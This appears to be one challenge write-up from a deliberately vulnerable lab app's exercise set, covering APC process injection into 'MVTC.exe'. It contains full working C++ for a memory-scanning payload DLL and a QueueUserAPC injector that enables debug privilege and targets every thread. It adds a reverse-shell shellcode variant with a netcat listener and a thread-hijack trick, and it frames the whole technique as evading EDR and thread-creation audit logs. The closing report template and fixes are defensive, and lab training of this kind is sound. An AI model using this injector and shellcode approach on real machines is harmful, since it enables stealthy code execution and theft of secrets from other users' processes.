# #14 — APC injection (QueueUserAPC)

**Category:** Process injection · **Tier:** MEDIUM · **Points:** 100 · **CWE:** CWE-114

## Objective

Inject your DLL into `MVTC.exe` without creating a new remote thread. Reuse an existing alertable thread by queueing a user-mode APC (`QueueUserAPC`) that calls `LoadLibraryA` on your DLL path. The payload reads the `#14` sentinel (`InjectionSentinels._apc`) from managed memory.

Advantage over #13: no new thread (quieter), fewer EDR hooks fire. Downside: you need to find an alertable thread.

## Prerequisites

Same as #13: Visual Studio 2022 Build Tools, Developer PowerShell, admin, know MVTC's PID.

---

## Payload DLL (reuse pattern from #13, just change the prefix)

Save as `payload_14.cpp`:

```cpp
// payload_14.cpp — writes the #14 sentinel to C:\Users\Public\v14.txt
#include <windows.h>
#include <psapi.h>
#include <cstring>
#pragma comment(lib, "psapi.lib")

static const char PREFIX[] = "MVTC{v14_apc_";
static const size_t PREFIX_LEN = sizeof(PREFIX) - 1;

static void WriteOut(const char* out, size_t len) {
    HANDLE f = CreateFileA("C:\\Users\\Public\\v14.txt",
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD w; WriteFile(f, out, (DWORD)len, &w, nullptr);
    CloseHandle(f);
}

static void HeapScan() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;
    MEMORY_BASIC_INFORMATION mbi;
    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) != 0 &&
            (mbi.Protect & PAGE_GUARD) == 0) {
            __try {
                unsigned char* p   = (unsigned char*)mbi.BaseAddress;
                unsigned char* top = p + mbi.RegionSize - PREFIX_LEN;
                for (; p < top; ++p) {
                    if (p[0] == 'M' && memcmp(p, PREFIX, PREFIX_LEN) == 0) {
                        unsigned char* e = p;
                        while (e < top + PREFIX_LEN + 128 && *e != '}') ++e;
                        if (e < top + PREFIX_LEN + 128) {
                            WriteOut((const char*)p, (size_t)(e - p) + 1);
                            return;
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH)
        CreateThread(nullptr, 0, [](LPVOID)->DWORD { HeapScan(); return 0; },
                     nullptr, 0, nullptr);
    return TRUE;
}
```

Build: `cl /LD /EHsc /O2 /nologo payload_14.cpp /Fe:mvtc_payload_14.dll`

---

## Injector — enumerate threads, queue APC to each

Save as `inject_14.cpp`:

```cpp
// inject_14.cpp — APC injection via QueueUserAPC
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

static bool EnableDebugPrivilege() {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return false;
    LUID luid;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        CloseHandle(tok); return false;
    }
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    CloseHandle(tok);
    return ok;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3) {
        wprintf(L"usage: inject_14.exe <pid> <absolute-path-to-dll>\n");
        return 1;
    }
    DWORD pid = (DWORD)_wtoi(argv[1]);
    char dllA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, argv[2], -1, dllA, sizeof(dllA), nullptr, nullptr);

    EnableDebugPrivilege();

    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!p) { wprintf(L"OpenProcess failed: %lu\n", GetLastError()); return 2; }

    // Write DLL path to remote process
    size_t len = strlen(dllA) + 1;
    LPVOID remote = VirtualAllocEx(p, nullptr, len, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(p, remote, dllA, len, nullptr);
    PTHREAD_START_ROUTINE loadlib =
        (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");

    // Enumerate every thread in the target
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (!th) continue;
            DWORD r = QueueUserAPC((PAPCFUNC)loadlib, th, (ULONG_PTR)remote);
            if (r) {
                queued++;
                wprintf(L"queued APC to tid=%lu\n", te.th32ThreadID);
            }
            CloseHandle(th);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    wprintf(L"queued %d APCs. Payload fires when any one enters an alertable wait.\n", queued);

    // Hint: user interaction (hover, click) typically triggers an alertable wait.
    // Alternatively, call NtTestAlert from the target - skipped for brevity.
    CloseHandle(p);
    return 0;
}
```

Build: `cl /EHsc /O2 /nologo inject_14.cpp /Fe:inject_14.exe`

---

## Run

```powershell
.\inject_14.exe 12345 "C:\path\to\mvtc_payload_14.dll"

# Now interact with the MVTC UI (move mouse over a button, type into a box).
# The UI thread enters an alertable wait and the APC fires.

type C:\Users\Public\v14.txt
```

Expected: `MVTC{v14_apc_<...>}` → submit for `+100 pts`.

---

## Why queue to every thread

Only *alertable* waits fire APCs. The WPF message pump calls `MsgWaitForMultipleObjectsEx` with `MWMO_ALERTABLE` during idle and after certain user input. Queueing to every thread maximises the chance that at least one hits an alertable wait within seconds of injection.

If nothing fires, nudge the UI (hover, click, resize the window). As a last resort, you can inject a tiny stub that calls `NtTestAlert()` on the target thread, but that's shellcode territory (see #18).

---

---

## Concept — what this attack actually is

APCs (Asynchronous Procedure Calls) are a built-in Windows mechanism for scheduling callbacks on a specific thread. Normally used for completion callbacks (`ReadFileEx`, timer callbacks), but if a target thread is in an **alertable wait** (`SleepEx`, `WaitForSingleObjectEx` with `bAlertable=TRUE`, or the WPF message pump during idle), the kernel will drain its APC queue and run whatever you queued.

**Attack value over #13:**
- No new thread → no `NtCreateThreadEx` ETW event
- No `CreateRemoteThread` kernel audit entry
- Looks like legitimate IO completion to naive detection
- Works even against targets that enabled some anti-`CreateRemoteThread` mitigations

**Preconditions:** the attacker needs `THREAD_SET_CONTEXT` on at least one thread in the target. Plus the target thread must enter an alertable wait at some point — for interactive apps this happens constantly (every mouse move, every text input).

---

## Discovery — how to spot this in a real target

Same discovery steps as #13, plus:

1. **Does the app have a UI?** → yes → the message pump enters alertable waits regularly → APC injection is reliable
2. **Does the app use `OVERLAPPED` IO with callbacks?** → yes → alertable waits by design
3. **Does the app have a background worker calling `SleepEx` or `WaitForSingleObjectEx`?** → check with x64dbg attach → **Call Stack**; look for `*Ex` family functions
4. **Thread count** — more threads = more APC targets = more reliable injection

Rule of thumb: any Win32 UI thick-client is APC-injectable. The question is just *which* thread.

---

## Impact demonstrations

### 1. Pop calc.exe

Replace the payload DLL's heap scanner with `WinExec("calc.exe", SW_SHOW);` (same change as #13). Fire the injector, then **interact with the MVTC UI** (hover a button, click a text box). The APC fires on the next alertable wait; `calc.exe` opens as a child of MVTC.exe.

### 2. Reverse shell (shellcode via APC)

Instead of queueing `LoadLibraryA`, queue your shellcode directly. Allocate shellcode in the target with `VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)`, then `QueueUserAPC((PAPCFUNC)remoteShellcode, hThread, 0)`.

```cpp
// in inject_14.cpp, replace the loadlib/remote line with:
unsigned char buf[] = { /* msfvenom x64 reverse_tcp bytes */ };
LPVOID scRemote = VirtualAllocEx(p, nullptr, sizeof(buf),
                                 MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, scRemote, buf, sizeof(buf), nullptr);
// Queue the shellcode address itself as the APC function
QueueUserAPC((PAPCFUNC)scRemote, th, 0);
```

Shellcode lands as the MVTC user. Catcher as before (`nc -lvnp 4444`).

### 3. Nudge the alertable wait if nothing fires

If the UI is idle and no APC fires, inject a one-shot `NtTestAlert()` via a tiny thread hijack (combines with #18):
```
SuspendThread → set RIP to NtTestAlert → ResumeThread
```
`NtTestAlert` drains the current thread's APC queue immediately.

---

## Report writeup template

**Finding title:** Process injection via APC queue into alertable thread

**Severity:** High (CVSS 7.8)

**CWE:** CWE-114

**Affected component:** `MVTC.exe` (any thread that enters an alertable wait — the WPF UI thread does this routinely)

**Description:** No mitigation prevents `QueueUserAPC` from an authorized caller. The MVTC UI thread enters alertable waits as part of normal message-pump operation, so an injected APC that targets `LoadLibraryA` or raw shellcode runs with near-certainty within seconds of the user interacting with the window.

**Reproduction:** compile `inject_14.cpp` + `payload_14.cpp`; `inject_14 <pid> <dll>`; move the mouse over the MVTC window. Secret exfiltrated at `C:\Users\Public\v14.txt`; reverse shell lands at listener.

**Impact / remediation:** identical to #13.

---

## Secure code fix

- `SetProcessMitigationPolicy` with `ProcessSystemCallDisablePolicy.DisallowWin32kSystemCalls = true` (where feasible — WPF uses win32k, so this won't apply to MVTC)
- Prefer `WaitForSingleObject` over `MsgWaitForMultipleObjectsEx` with `MWMO_ALERTABLE` on sensitive threads
- Register for ETW `Microsoft-Windows-Kernel-Process` → `ApcQueue` and alert when a non-system module is queued
- Rotate / zero injection sentinels after use (same fix as #27)
